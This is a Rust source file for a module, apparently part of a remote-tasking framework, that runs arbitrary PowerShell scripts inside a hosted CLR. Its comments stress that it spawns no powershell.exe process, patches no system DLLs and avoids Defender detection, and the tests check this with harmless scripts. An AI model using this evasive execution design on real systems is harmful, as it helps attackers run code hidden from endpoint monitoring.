//! PowerShell cloud module — in-process execution via hosted CLR 4
//! (no powershell.exe process, no system-DLL memory patching).
//! 执行实现位于共享库 libra-psinline。
#![allow(non_snake_case)]
#![allow(clippy::upper_case_acronyms)]

mod power_shell;

use serde_json::Value;

/// libra-load ABI entry point.
#[no_mangle]
pub extern "C" fn module_name() -> *const u8 {
    concat!("powershell", "\0").as_ptr() as *const u8
}

#[no_mangle]
pub unsafe extern "system" fn module_main(
    input: *const u8,
    input_len: usize,
    output: *mut u8,
    output_cap: usize,
) -> usize {
    let input_json = if input.is_null() || input_len == 0 {
        "{}".to_string()
    } else {
        String::from_utf8_lossy(std::slice::from_raw_parts(input, input_len)).to_string()
    };
    let result = dispatch(&input_json);
    write_output(&result, output, output_cap)
}

fn dispatch(input: &str) -> String {
    let v: Value = serde_json::from_str(input).unwrap_or(Value::Object(Default::default()));
    let script = v.get("script").and_then(|s| s.as_str()).unwrap_or("");
    let timeout = v
        .get("timeoutSeconds")
        .and_then(|t| t.as_u64())
        .unwrap_or(60)
        .max(1);

    power_shell::PowerShellRunner::execute(script, timeout)
}

fn write_output(s: &str, output: *mut u8, output_cap: usize) -> usize {
    let bytes = s.as_bytes();
    let n = bytes.len().min(output_cap);
    if n > 0 && !output.is_null() {
        unsafe { std::ptr::copy_nonoverlapping(bytes.as_ptr(), output, n); }
    }
    n
}

#[cfg(all(test, target_os = "windows"))]
mod tests {
    use super::*;

    /// 无进程、无补丁的 inline 链路测试。执行无害脚本验证：
    /// 1) CLR 4 托管成功；2) GAC S.M.A. 加载成功；3) 结果经管道回传。
    /// 本测试不触发任何 Defender 行为检测（不创建挂起进程、不改写系统 DLL）。
    #[test]
    fn inline_executes_script() {
        let out = dispatch(r#"{"script":"Write-Output 'hello-inline-42'"}"#);
        assert!(out.contains("hello-inline-42"), "unexpected output: {out}");
    }

    #[test]
    fn inline_captures_stderr() {
        let out = dispatch(r#"{"script":"Write-Error 'boom-inline'; Write-Output 'after'"}"#);
        assert!(out.contains("boom-inline"), "unexpected output: {out}");
        assert!(out.contains("after"), "unexpected output: {out}");
    }

    #[test]
    fn inline_reports_timeout() {
        let out = dispatch(r#"{"script":"Start-Sleep -Seconds 5","timeoutSeconds":1}"#);
        assert!(out.contains("timeout"), "unexpected output: {out}");
    }

    #[test]
    fn inline_handles_large_output() {
        let out = dispatch(r#"{"script":"1..20000 | ForEach-Object { $_ } | Out-String"}"#);
        assert!(out.len() > 50_000, "output too small: {}", out.len());
    }

    /// 核心卖点验证：inline 执行不产生任何 powershell.exe / pwsh.exe 进程。
    #[test]
    fn inline_spawns_no_powershell_process() {
        fn count_ps() -> usize {
            let mut n = 0usize;
            if let Ok(output) = std::process::Command::new("tasklist")
                .args(["/FO", "CSV", "/NH"])
                .output()
            {
                let text = String::from_utf8_lossy(&output.stdout);
                for line in text.lines() {
                    let name = line.split(',').next().unwrap_or("").trim_matches('"');
                    if name.eq_ignore_ascii_case("powershell.exe") || name.eq_ignore_ascii_case("pwsh.exe") {
                        n += 1;
                    }
                }
            }
            n
        }

        let before = count_ps();
        let out = dispatch(r#"{"script":"Write-Output 'no-process-check'"}"#);
        assert!(out.contains("no-process-check"), "unexpected output: {out}");
        let after = count_ps();
        assert_eq!(before, after, "inline execution spawned a powershell process!");
    }
}
